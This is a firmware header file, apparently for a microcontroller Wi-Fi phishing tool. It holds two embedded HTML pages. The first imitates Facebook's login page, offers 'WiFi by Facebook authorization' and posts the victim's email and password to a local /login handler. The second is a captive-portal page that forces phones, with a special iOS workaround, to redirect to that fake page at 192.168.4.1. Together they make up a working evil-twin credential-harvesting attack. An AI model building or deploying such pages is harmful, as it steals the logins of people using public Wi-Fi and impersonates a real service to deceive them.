#ifndef CREDENTIALS_H
#define CREDENTIALS_H

const char login_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      max-width: 980px;
    }
    .logo-section {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo {
      font-size: 48px;
      font-weight: bold;
      color: #1877f2;
      margin-bottom: 10px;
    }
    .logo-text {
      font-size: 24px;
      font-weight: normal;
      line-height: 32px;
      width: 500px;
      text-align: center;
    }
    .login-container {
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
      padding: 20px;
      width: 396px;
    }
    .login-form {
      display: flex;
      flex-direction: column;
    }
    .login-form input {
      height: 22px;
      padding: 14px 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      margin-bottom: 15px;
      font-size: 17px;
    }
    .login-form input[type="submit"] {
      background-color: #1877f2;
      color: white;
      font-size: 20px;
      font-weight: bold;
      height: 48px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .forgot-password {
      text-align: center;
      margin-bottom: 20px;
    }
    .forgot-password a {
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }
    .divider {
      border-bottom: 1px solid #dadde1;
      margin: 20px 0;
    }
    .create-account {
      text-align: center;
    }
    .create-button {
      background-color: #42b72a;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 17px;
      line-height: 48px;
      padding: 0 16px;
      text-decoration: none;
      display: inline-block;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-section">
      <div class="logo">facebook</div>
      <h2 class="logo-text">Get access to WiFi by Facebook authorization</h2>
    </div>
    <div class="login-container">
      <form action="/login" method="POST" class="login-form">
        <input type="text" name="username" placeholder="Email address or phone number">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" value="Login">
        <div class="forgot-password">
          <a href="#">Forgotten password?</a>
        </div>
        <div class="divider"></div>
        <div class="create-account">
          <a href="#" class="create-button">Create new account</a>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
)rawliteral";

const char captive_portal[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Попытка редиректа для всех устройств
        function redirect() {
            window.location.replace("http://192.168.4.1/");
        }
        // Специальный обход для iOS
        function iosRedirect() {
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'http://192.168.4.1/.well-known/ios-redirect?' + Math.random();
            document.body.appendChild(iframe);
            setTimeout(function() {
                window.location.replace("http://192.168.4.1/");
            }, 500);
        }
        // Пробуем оба метода
        setTimeout(redirect, 100);
        setTimeout(iosRedirect, 600);
    </script>
    <meta http-equiv="refresh" content="2; url=http://192.168.4.1/" />
</head>
<body onload="redirect()">
    <p style="text-align: center; margin-top: 50px;">
        Redirecting to login page...<br>
        If not redirected automatically, <a href="http://192.168.4.1/">click here</a>.
    </p>
</body>
</html>
)rawliteral";

#endif